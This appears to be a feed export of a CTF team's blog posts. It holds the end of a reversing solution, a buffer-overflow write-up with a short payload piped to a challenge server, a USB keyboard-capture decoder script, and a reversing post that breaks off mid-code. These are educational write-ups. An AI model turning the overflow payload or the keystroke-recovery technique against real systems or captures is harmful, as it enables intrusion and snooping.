<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> r2pipe</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">profile = <span class="string">"""#!/usr/bin/rarun2</span></div><div class="line"><span class="string">program=./rev_rev_rev</span></div><div class="line"><span class="string">stdin=output</span></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'profile.r2'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> f:</div><div class="line">	<span class="keyword">print</span> &gt;&gt;f, profile</div><div class="line"></div><div class="line">buf = struct.pack (<span class="string">"31B"</span>, *[</div><div class="line"><span class="number">0x41</span>,<span class="number">0x29</span>,<span class="number">0xd9</span>,<span class="number">0x65</span>,<span class="number">0xa1</span>,<span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0xc9</span>,<span class="number">0x19</span>,<span class="number">0x09</span>,<span class="number">0x93</span>,</div><div class="line"><span class="number">0x13</span>,<span class="number">0xa1</span>,<span class="number">0x09</span>,<span class="number">0xb9</span>,<span class="number">0x49</span>,<span class="number">0xb9</span>,<span class="number">0x89</span>,<span class="number">0xdd</span>,<span class="number">0x61</span>,<span class="number">0x31</span>,<span class="number">0x69</span>,</div><div class="line"><span class="number">0xa1</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0x21</span>,<span class="number">0x9d</span>,<span class="number">0xd5</span>,<span class="number">0x3d</span>,<span class="number">0x15</span>,<span class="number">0xd5</span>])</div><div class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> f:</div><div class="line">	<span class="keyword">print</span> &gt;&gt;f, buf</div><div class="line"></div><div class="line"></div><div class="line">r2=r2pipe.open(<span class="string">'./rev_rev_rev'</span>)</div><div class="line">r2.cmd(<span class="string">"e dbg.profile=profile.r2"</span>)</div><div class="line">r2.cmd(<span class="string">"doo"</span>)</div><div class="line">r2.cmd(<span class="string">"db 0x804866D"</span>)</div><div class="line">r2.cmd(<span class="string">"dc"</span>)</div><div class="line">ciphertext = r2.cmd(<span class="string">"pcp 31@ 0x8048870"</span>)</div><div class="line"><span class="keyword">print</span> r2.cmd(<span class="string">"psz @ (ebp-0x2d)"</span>)</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python revrevrev.py 2&gt;/dev/null </div><div class="line">TWCTF&#123;qpzisyDnbmboz76oglxpzYdk&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt; Rev Rev Rev&lt;br&gt;Problem&lt;br&gt;&lt;br&gt;&lt;a href=&quot;/content/files/tokyo-westerns-3rd-2007/rev_rev_rev&quot;&gt;rev_rev_rev&lt;/a&gt;&lt;br&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it!</title>
    <link href="https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/"/>
    <id>https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/</id>
    <published>2017-09-04T00:29:07.000Z</published>
    <updated>2017-09-04T07:50:31.520Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Just do it!<br>Problem<br><br>Do it! Do it!<br><br>nc pwn1.chal.ctf.westerns.tokyo 12345<br>(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)<br><br><a href="/content/files/tokyo-westerns-3rd-2007/just">just_do_it</a><br></blockquote>

<p>Starting by De-assembler with ida and use its ability to some c pseudo code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+8h] [bp-20h]@7</span></div><div class="line">  FILE *stream; <span class="comment">// [sp+18h] [bp-10h]@1</span></div><div class="line">  <span class="keyword">char</span> *v6; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  v6 = failed_message;</div><div class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">if</span> ( !stream )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"file open error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( !fgets(flag, <span class="number">48</span>, stream) )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"file read error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome my secret service. Do you know the password?"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Input the password."</span>);</div><div class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>) )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"input error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, PASSWORD) )</div><div class="line">    v6 = success_message;</div><div class="line">  <span class="built_in">puts</span>(v6);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>We can see clearly there is a buffer overflow problem on <code>strcmp</code> PASSWORD comes from <code>STDIN</code>, if we give a password greater than the variable s can handle, we will overflow in this one we don’t even need to modify the ret address. We can just modify the address from v6 to the flag variable address! which is stored from a file “flag.txt” in the server.  </p>
<p>First lets just discover the offset we could know this by looking at the assembly code and check how space was saved in the stack for this variable by looking the offset from ebp or we can just use gdb with some help from metasploit to generate patterns:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 </div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line">$ gdb ./justdoit</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/evilgod/Documents/Hacking/ctf/tokyo/pwn/justdoit/just </div><div class="line">Welcome my secret service. Do you know the password?</div><div class="line">Input the password.</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line"></div><div class="line">Program received signal SIGSEGV (fault address 0x37614136)</div></pre></td></tr></table></figure>
<p>We can see it broke at address <code>0x37614136</code> we again can calculate it in metasploit with pattern_offset</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136</div><div class="line">[*] Exact match at offset 20</div></pre></td></tr></table></figure>
<p>Now we can see we need to add more than 20 characters to overflow! now lets use IDA to get the address where is stored our flag:  </p>
<p><img src="https://i.imgur.com/kvzhTyr.png" alt="Flag Address"></p>
<p>And finally writing a script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">FLAG = <span class="number">0x0804A080</span></div><div class="line">payload = <span class="string">'A'</span> *<span class="number">20</span> + struct.pack(<span class="string">'&lt;L'</span>,FLAG)</div><div class="line"><span class="keyword">print</span> payload</div></pre></td></tr></table></figure>
<p>getting the flag….<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python justdoit.py | nc pwn1.chal.ctf.westerns.tokyo 12482</div><div class="line">Welcome my secret service. Do you know the password?</div><div class="line">Input the password.</div><div class="line">TWCTF&#123;pwnable_warmup_I_did_it!&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Just do it!&lt;br&gt;Problem&lt;br&gt;&lt;br&gt;Do it! Do it!&lt;br&gt;&lt;br&gt;nc pwn1.chal.ctf.westerns.tokyo 12345&lt;br&gt;(Alternative port: nc pwn1.chal.
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] Hackit 2017 - USB ducker</title>
    <link href="https://teamrocketist.github.io/2017/08/29/Forensics-Hackit-2017-USB-ducker/"/>
    <id>https://teamrocketist.github.io/2017/08/29/Forensics-Hackit-2017-USB-ducker/</id>
    <published>2017-08-29T16:25:11.000Z</published>
    <updated>2017-08-29T17:21:15.212Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>USB ducker<br>foren100<br><br>Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag{…} )<br><br>Attachment: (none)<br><br>Webpage: <a href="https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3M" target="_blank" rel="external">https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3M</a><br><br>Hint: (none)<br></blockquote>

<p>Another USB pcap, after analysing it with wireshark we can see that we have two devices one is a keyboard(bInterfaceClass: HID: 0x3) and the other is a mouse(Unknown)…   </p>
<h4 id="Mouse"><a href="#Mouse" class="headerlink" title="Mouse"></a>Mouse</h4><p><img src="https://i.imgur.com/D8RJ4RK.png" alt="keyboard"></p>
<h4 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h4><p><img src="https://i.imgur.com/z4ugtLV.png" alt="keyboard"></p>
<p>We can clearly see we that HID: 0x3 is a keyboard by searching for strings in wireshark EDIT -&gt; Find Packet<br><img src="https://i.imgur.com/JYLtVK1.png" alt="keyboard"></p>
<p>I actually tried to see what the hacker did with the mouse but didn’t found anything special just a straight line of clicks you could parse the mouse inputs with tshark like this for example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r task.pcap -Y <span class="string">"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass!=3"</span> -Tfields -e usb.capdata &gt; mouse</div></pre></td></tr></table></figure></p>
<p>Moving on to the keyboard since the mouse didn’t got us anything special we just got the output from the keyboard<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r task.pcap -Y <span class="string">"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass==3"</span> -Tfields -e usb.capdata &gt; keyboard</div></pre></td></tr></table></figure></p>
<p>Now the tricky part here is, the hacker used the arrow keys! making it harder to make a script to spit out the keyboard inputs, well during the CTF I got frustrated, and choose to make it by hand by looking at the table on <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" target="_blank" rel="external">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a> (table 12). The keyboard inputs can be read like this:   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">      |-&gt; The value of the keypressed you can &quot;decode&quot; this value from the table 12 above</div><div class="line">      |</div><div class="line">02:00:20:00:00:00:00:00</div><div class="line">| </div><div class="line">|--&gt; This value is 02 when shift is pressed and 00 when it isn&apos;t</div></pre></td></tr></table></figure>
<p>When the CTF finished I ended up doing a script to do this (it’s not perfect there is alot of more things to consider).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">KEY_CODES = &#123;</div><div class="line">    <span class="number">0x04</span>:[<span class="string">'a'</span>, <span class="string">'A'</span>],</div><div class="line">    <span class="number">0x05</span>:[<span class="string">'b'</span>, <span class="string">'B'</span>],</div><div class="line">    <span class="number">0x06</span>:[<span class="string">'c'</span>, <span class="string">'C'</span>],</div><div class="line">    <span class="number">0x07</span>:[<span class="string">'d'</span>, <span class="string">'D'</span>],</div><div class="line">    <span class="number">0x08</span>:[<span class="string">'e'</span>, <span class="string">'E'</span>],</div><div class="line">    <span class="number">0x09</span>:[<span class="string">'f'</span>, <span class="string">'F'</span>],</div><div class="line">    <span class="number">0x0A</span>:[<span class="string">'g'</span>, <span class="string">'G'</span>],</div><div class="line">    <span class="number">0x0B</span>:[<span class="string">'h'</span>, <span class="string">'H'</span>],</div><div class="line">    <span class="number">0x0C</span>:[<span class="string">'i'</span>, <span class="string">'I'</span>],</div><div class="line">    <span class="number">0x0D</span>:[<span class="string">'j'</span>, <span class="string">'J'</span>],</div><div class="line">    <span class="number">0x0E</span>:[<span class="string">'k'</span>, <span class="string">'K'</span>],</div><div class="line">    <span class="number">0x0F</span>:[<span class="string">'l'</span>, <span class="string">'L'</span>],</div><div class="line">    <span class="number">0x10</span>:[<span class="string">'m'</span>, <span class="string">'M'</span>],</div><div class="line">    <span class="number">0x11</span>:[<span class="string">'n'</span>, <span class="string">'N'</span>],</div><div class="line">    <span class="number">0x12</span>:[<span class="string">'o'</span>, <span class="string">'O'</span>],</div><div class="line">    <span class="number">0x13</span>:[<span class="string">'p'</span>, <span class="string">'P'</span>],</div><div class="line">    <span class="number">0x14</span>:[<span class="string">'q'</span>, <span class="string">'Q'</span>],</div><div class="line">    <span class="number">0x15</span>:[<span class="string">'r'</span>, <span class="string">'R'</span>],</div><div class="line">    <span class="number">0x16</span>:[<span class="string">'s'</span>, <span class="string">'S'</span>],</div><div class="line">    <span class="number">0x17</span>:[<span class="string">'t'</span>, <span class="string">'T'</span>],</div><div class="line">    <span class="number">0x18</span>:[<span class="string">'u'</span>, <span class="string">'U'</span>],</div><div class="line">    <span class="number">0x19</span>:[<span class="string">'v'</span>, <span class="string">'V'</span>],</div><div class="line">    <span class="number">0x1A</span>:[<span class="string">'w'</span>, <span class="string">'W'</span>],</div><div class="line">    <span class="number">0x1B</span>:[<span class="string">'x'</span>, <span class="string">'X'</span>],</div><div class="line">    <span class="number">0x1C</span>:[<span class="string">'y'</span>, <span class="string">'Y'</span>],</div><div class="line">    <span class="number">0x1D</span>:[<span class="string">'z'</span>, <span class="string">'Z'</span>],</div><div class="line">    <span class="number">0x1E</span>:[<span class="string">'1'</span>, <span class="string">'!'</span>],</div><div class="line">    <span class="number">0x1F</span>:[<span class="string">'2'</span>, <span class="string">'@'</span>],</div><div class="line">    <span class="number">0x20</span>:[<span class="string">'3'</span>, <span class="string">'#'</span>],</div><div class="line">    <span class="number">0x21</span>:[<span class="string">'4'</span>, <span class="string">'$'</span>],</div><div class="line">    <span class="number">0x22</span>:[<span class="string">'5'</span>, <span class="string">'%'</span>],</div><div class="line">    <span class="number">0x23</span>:[<span class="string">'6'</span>, <span class="string">'^'</span>],</div><div class="line">    <span class="number">0x24</span>:[<span class="string">'7'</span>, <span class="string">'&amp;'</span>],</div><div class="line">    <span class="number">0x25</span>:[<span class="string">'8'</span>, <span class="string">'*'</span>],</div><div class="line">    <span class="number">0x26</span>:[<span class="string">'9'</span>, <span class="string">'('</span>],</div><div class="line">    <span class="number">0x27</span>:[<span class="string">'0'</span>, <span class="string">')'</span>],</div><div class="line">    <span class="number">0x28</span>:[<span class="string">'\n'</span>,<span class="string">'\n'</span>],</div><div class="line">    <span class="number">0x2C</span>:[<span class="string">' '</span>, <span class="string">' '</span>],</div><div class="line">    <span class="number">0x2D</span>:[<span class="string">'-'</span>, <span class="string">'_'</span>],</div><div class="line">    <span class="number">0x2E</span>:[<span class="string">'='</span>, <span class="string">'+'</span>],</div><div class="line">    <span class="number">0x2F</span>:[<span class="string">'['</span>, <span class="string">'&#123;'</span>],</div><div class="line">    <span class="number">0x30</span>:[<span class="string">']'</span>, <span class="string">'&#125;'</span>],</div><div class="line">    <span class="number">0x32</span>:[<span class="string">'#'</span>,<span class="string">'~'</span>],</div><div class="line">    <span class="number">0x33</span>:[<span class="string">';'</span>, <span class="string">':'</span>],</div><div class="line">    <span class="number">0x34</span>:[<span class="string">'\''</span>, <span class="string">'"'</span>],</div><div class="line">    <span class="number">0x36</span>:[<span class="string">','</span>, <span class="string">'&lt;'</span>],</div><div class="line">    <span class="number">0x38</span>:[<span class="string">'/'</span>, <span class="string">'?'</span>],</div><div class="line">    <span class="number">0x37</span>:[<span class="string">'.'</span>, <span class="string">'&gt;'</span>],</div><div class="line">    <span class="number">0x2b</span>:[<span class="string">'\t'</span>,<span class="string">'\t'</span>],</div><div class="line">    <span class="number">0x4f</span>:[<span class="string">u'→'</span>,<span class="string">u'→'</span>],</div><div class="line">    <span class="number">0x50</span>:[<span class="string">u'←'</span>,<span class="string">u'←'</span>],</div><div class="line">    <span class="number">0x51</span>:[<span class="string">u'↓'</span>,<span class="string">u'↓'</span>],</div><div class="line">    <span class="number">0x52</span>:[<span class="string">u'↑'</span>,<span class="string">u'↑'</span>]</div><div class="line">&#125;</div><div class="line">   </div><div class="line"><span class="comment">#tshark -r ./usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata &gt; keyboards.txt</span></div><div class="line">datas = open(<span class="string">'keyboard'</span>).read().split(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</div><div class="line">cursor_x = <span class="number">0</span></div><div class="line">cursor_y = <span class="number">0</span></div><div class="line">offset_current_line = <span class="number">0</span></div><div class="line">lines = [<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>]</div><div class="line">output = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</div><div class="line">    shift = int(data.split(<span class="string">':'</span>)[<span class="number">0</span>], <span class="number">16</span>) / <span class="number">2</span></div><div class="line">    key = int(data.split(<span class="string">':'</span>)[<span class="number">2</span>], <span class="number">16</span>)</div><div class="line">    <span class="keyword">if</span> key == <span class="number">0</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">if</span> KEY_CODES[key][shift] == <span class="string">u'↑'</span>:</div><div class="line">        lines[cursor_y] += output</div><div class="line">        output = <span class="string">''</span></div><div class="line">        cursor_y -= <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> KEY_CODES[key][shift] == <span class="string">u'↓'</span>:</div><div class="line">        lines[cursor_y] += output</div><div class="line">        output = <span class="string">''</span></div><div class="line">        cursor_y += <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> KEY_CODES[key][shift] == <span class="string">u'→'</span>:</div><div class="line">        cursor_x += <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> KEY_CODES[key][shift] == <span class="string">u'←'</span>:</div><div class="line">        cursor_x -= <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> KEY_CODES[key][shift] == <span class="string">'\n'</span>:</div><div class="line">        lines[cursor_y] += output</div><div class="line">        cursor_x = <span class="number">0</span></div><div class="line">        cursor_y += <span class="number">1</span></div><div class="line">        output = <span class="string">''</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        output += KEY_CODES[key][shift]</div><div class="line">        cursor_x += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</div></pre></td></tr></table></figure>
<p>Now running the script</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">teamrocketist@Debian ~/D/H/c/h/f/for100&gt; python key2.py</div><div class="line">w&#123;w<span class="variable">$ju</span>&#125;,<span class="string">'pt]=j%;9+ps&amp;#,</span></div><div class="line"><span class="string">k#&gt;bn$:6pjim0&#123;u'</span>h;fks!s-</div><div class="line">flag&#123;k3yb0ard_sn4ke_2.0&#125;</div><div class="line">b[[e[fu~7d[=&gt;*(0]<span class="string">'$1c$ce</span></div><div class="line"><span class="string">3'</span>ci.[%=%&amp;k(lc*2y4!&#125;%qz3</div></pre></td></tr></table></figure>
<p>The flag is flag{k3yb0ard_sn4ke_2.0}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;USB ducker&lt;br&gt;foren100&lt;br&gt;&lt;br&gt;Description: This file was captured from one of the computers at the Internet cafe. We think t
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="pcap" scheme="https://teamrocketist.github.io/tags/pcap/"/>
    
      <category term="keyboard" scheme="https://teamrocketist.github.io/tags/keyboard/"/>
    
      <category term="mouse" scheme="https://teamrocketist.github.io/tags/mouse/"/>
    
      <category term="wireshark" scheme="https://teamrocketist.github.io/tags/wireshark/"/>
    
      <category term="tshark" scheme="https://teamrocketist.github.io/tags/tshark/"/>
    
      <category term="usb" scheme="https://teamrocketist.github.io/tags/usb/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Hackit 2017 - rev200</title>
    <link href="https://teamrocketist.github.io/2017/08/27/Reverse-Hackit-2017-rev200/"/>
    <id>https://teamrocketist.github.io/2017/08/27/Reverse-Hackit-2017-rev200/</id>
    <published>2017-08-27T22:21:35.000Z</published>
    <updated>2017-08-27T23:26:57.663Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>rev200<br><br>Description: You haxor, come on you little sciddie… debug me, eh? You fucking little lamer… You fuckin’ come on, come debug me! I’ll get your ass, you jerk! Oh, you IDA monkey! Fuck all you and your tools! Come on, you scum haxor, you try to reverse me? Come on, you asshole!!<br><br>Attachment: (none)<br><br>Webpage: <a href="https://mega.nz/#!RQJk0ZbR!7myppeUU6fwqRY2cOaX8EPTpC9pVIHEsWdUNw0szexc" target="_blank" rel="external">https://mega.nz/#!RQJk0ZbR!7myppeUU6fwqRY2cOaX8EPTpC9pVIHEsWdUNw0szexc</a><br><br>Hint: (none)<br></blockquote>

<p>When I looked up into this challenge I just checked the assembly code and found it way too easy for 200 points, but then I saw something weird I couldn’t start it for debugging and then I checked the file types:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file rev200\ \(1\).efi </div><div class="line">rev200 (1).efi: PE32+ executable (DLL) (EFI application) x86-64 (stripped to external PDB), <span class="keyword">for</span> MS Windows</div></pre></td></tr></table></figure>
<p>Oh its a ddl, that’s why well I still found it way to easy for all this points specially because with IDA we can convert this beautiful assembly code(missing the code for algo function):<br><img src="https://i.imgur.com/F3vhOvA.png" alt="Assembly IDA"></p>
<p>Into this beautiful “pseudo c” code(press F5 in IDA), well it makes everything much easier even thought the assembly wasn’t that hard to reverse…. Here we have the pseudo c code for “main” function and “algo” function…</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">efi_main</span><span class="params">(__int64 a1, __int64 a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  UINTN v2; <span class="comment">// rbx@3</span></div><div class="line">  <span class="keyword">char</span> v4[<span class="number">48</span>]; <span class="comment">// [sp+20h] [bp-A0h]@1</span></div><div class="line">  __int16 v5; <span class="comment">// [sp+48h] [bp-78h]@1</span></div><div class="line">  CHAR16 String[<span class="number">48</span>]; <span class="comment">// [sp+50h] [bp-70h]@1</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+A0h] [bp-20h]@1</span></div><div class="line">  <span class="keyword">char</span> v8; <span class="comment">// [sp+B0h] [bp-10h]@4</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+B8h] [bp-8h]@1</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+BCh] [bp-4h]@1</span></div><div class="line">  __int64 v11; <span class="comment">// [sp+E8h] [bp+28h]@1</span></div><div class="line"></div><div class="line">  v11 = a2;</div><div class="line">  InitializeLib();</div><div 